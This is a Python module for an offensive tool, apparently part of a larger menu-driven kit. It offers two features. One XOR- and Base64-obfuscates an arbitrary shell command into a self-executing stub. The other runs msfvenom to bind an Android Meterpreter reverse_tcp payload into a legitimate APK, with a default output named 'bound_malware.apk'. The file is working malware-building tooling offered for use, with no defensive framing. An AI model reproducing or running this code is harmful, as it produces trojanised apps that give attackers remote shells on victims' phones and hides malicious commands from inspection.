"""
Aadi — Advanced Payload Obfuscator & APK Binner Module (Fully Fixed)
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import os
import subprocess
import base64
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich import box

console = Console()


def xor_encrypt(data: bytes, key: int = 0x5A) -> bytes:
    """XOR encryption/decryption for basic payload obfuscation."""
    return bytes([b ^ key for b in data])


def generate_obfuscated_shellcode(raw_command: str, output_file: str = "obfuscated_payload.py") -> str:
    """Generate XOR encoded and Base64 wrapped Python payload stub using safe string replacement."""
    if not raw_command:
        console.print("[bold red]✗ Command string cannot be empty![/]")
        return None

    console.print(Panel(
        f"[bold cyan]Generating Advanced XOR + Base64 Obfuscated Payload[/]\n"
        f"[white]Original Command:[/] [yellow]{raw_command}[/]",
        title="[bold magenta]🔒 AADI Obfuscation Engine[/]",
        border_style="magenta"
    ))

    try:
        raw_bytes = raw_command.encode("utf-8")
        encrypted = xor_encrypt(raw_bytes, 0x5A)
        encoded_b64 = base64.b64encode(encrypted).decode("utf-8")

        stub_template = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto-generated Obfuscated Payload Stub
Generated via AADI Security Framework
Author: Aaditya Kumar Pandey
"""

import base64
import os

ENCODED_PAYLOAD = "__PAYLOAD_PLACEHOLDER__"

def xor_decrypt(data, key=0x5A):
    return bytes([b ^ key for b in data])

def execute_payload():
    try:
        decoded_bytes = base64.b64decode(ENCODED_PAYLOAD)
        original_cmd = xor_decrypt(decoded_bytes, 0x5A).decode("utf-8")
        print("[*] Deploying payload securely...")
        os.system(original_cmd)
    except Exception as err:
        print("[-] Execution error:", err)

if __name__ == "__main__":
    execute_payload()
'''

        final_stub_code = stub_template.replace("__PAYLOAD_PLACEHOLDER__", encoded_b64)

        with open(output_file, "w", encoding="utf-8") as f:
            f.write(final_stub_code)

        console.print(f"[bold green]✓ Obfuscated payload successfully written to:[/] [cyan]{output_file}[/]")
        return output_file

    except Exception as e:
        console.print(f"[bold red]✗ Failed to generate obfuscated stub:[/] {e}")
        return None


def bind_apk_with_payload(legitimate_apk: str, payload_apk: str) -> bool:
    """Guide or automate APK binding using msfvenom template injection with robust error checks."""
    if not os.path.exists(legitimate_apk):
        console.print(f"[bold red]✗ Legitimate APK not found:[/] {legitimate_apk}")
        return False

    if not os.path.exists(payload_apk):
        console.print(f"[bold red]✗ Payload APK not found:[/] {payload_apk}")
        return False

    console.print(Panel(
        "[bold yellow]⚠ APK Binding Prerequisite Notice[/]\n"
        "Binding payloads into legitimate APKs requires [bold]msfvenom[/], [bold]apktool[/], "
        "and Java development kits (`jarsigner`/`keytool`) properly configured in your system PATH.",
        title="[bold cyan]📦 APK Binner Utility[/]",
        border_style="yellow"
    ))

    console.print("[cyan][*] Manual msfvenom binding template command:[/]")
    console.print(
        f"[bold white]msfvenom -x {legitimate_apk} -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o bound_app.apk[/]"
    )

    if Confirm.ask("[cyan]Would you like AADI to execute msfvenom APK binding now?[/]", default=False):
        lhost = Prompt.ask("[cyan]Enter LHOST (Listener IP)[/]")
        lport = Prompt.ask("[cyan]Enter LPORT (Listener Port)[/]", default="4444")
        out_name = Prompt.ask("[cyan]Enter output bound APK filename[/]", default="bound_malware.apk")

        cmd = [
            "msfvenom", "-x", legitimate_apk,
            "-p", "android/meterpreter/reverse_tcp",
            f"LHOST={lhost}", f"LPORT={lport}",
            "-o", out_name
        ]

        console.print(f"[yellow][*] Running command: {' '.join(cmd)}[/]")

        try:
            with console.status("[cyan]Binding payload into APK (this may take a few moments)...[/]"):
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0 and os.path.exists(out_name):
                size = os.path.getsize(out_name)
                console.print(
                    f"[bold green]✓ Bound APK generated successfully:[/] [cyan]{out_name}[/] ([white]{size} bytes[/])")
                return True
            else:
                stderr_msg = result.stderr.strip() if result.stderr else "Unknown error"
                console.print(f"[bold red]✗ Msfvenom binding failed:[/] {stderr_msg}")
                return False
        except subprocess.TimeoutExpired:
            console.print("[bold red]✗ Process timed out during APK binding.[/]")
            return False
        except FileNotFoundError:
            console.print("[bold red]✗ 'msfvenom' tool is not installed or not found in system PATH.[/]")
            return False
        except Exception as e:
            console.print(f"[bold red]✗ Execution error:[/] {e}")
            return False
    return False


def payload_obfuscation_menu():
    """Interactive menu for advanced payload operations with clean exit handling."""
    while True:
        console.rule("[bold magenta]🎯 Advanced Payload Obfuscator & Binner[/]")
        console.print("  [cyan]1.[/] XOR + Base64 Custom Python Stub Obfuscation")
        console.print("  [cyan]2.[/] Legitimate APK + Metasploit Payload Binner")
        console.print("  [cyan]0.[/] Back to Main Menu")

        # यहाँ फिक्स किया गया है: प्रॉम्प्ट स्ट्रिंग और choices अलग-अलग पास किए गए हैं
        choice = Prompt.ask(
            "[cyan]Select Option ▶[/]",
            choices=["0", "1", "2"],
            default="0"
        )

        if choice == "0":
            break
        elif choice == "1":
            cmd = Prompt.ask("[cyan]Enter shell command or payload string to obfuscate[/]")
            if cmd:
                out_filename = Prompt.ask(
                    "[cyan]Enter output Python filename[/]",
                    default="obfuscated_payload.py"
                )
                generate_obfuscated_shellcode(cmd, out_filename)
        elif choice == "2":
            legit = Prompt.ask("[cyan]Enter path to legitimate APK (e.g. target.apk)[/]")
            payload = Prompt.ask("[cyan]Enter path to payload APK (e.g. payload.apk)[/]")
            if legit and payload:
                bind_apk_with_payload(legit, payload)